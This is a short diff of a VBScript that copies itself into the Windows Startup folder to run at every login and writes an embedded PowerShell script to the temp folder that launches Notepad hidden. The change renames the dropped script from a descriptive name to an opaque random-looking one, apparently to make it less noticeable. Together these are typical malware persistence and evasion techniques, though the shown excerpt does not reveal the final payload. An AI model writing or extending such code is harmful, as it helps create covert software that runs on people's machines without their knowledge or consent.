@@ -11,14 +11,14 @@ tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
 scriptPath = WScript.ScriptFullName
 destPath = startupPath & "\BootScript.vbs"
 notepadScriptPath = startupPath & "\wtc9AACOD031020.vbs"
-psScriptPath = tempFolder & "\NotepadMessage.ps1"
+psScriptPath = tempFolder & "\wtc9AACOD031020.ps1"
 
 ' Copy this script to Startup
 If Not fso.FileExists(destPath) Then
     fso.CopyFile scriptPath, destPath
 End If
 
-' Write the embedded PowerShell NotepadMessage.ps1 script
+' Write the embedded PowerShell wtc9AACOD031020.ps1 script
 Set psFile = fso.CreateTextFile(psScriptPath, True)
 psFile.WriteLine "# Start Notepad in hidden mode"
 psFile.WriteLine "$notepad = Start-Process -PassThru notepad"
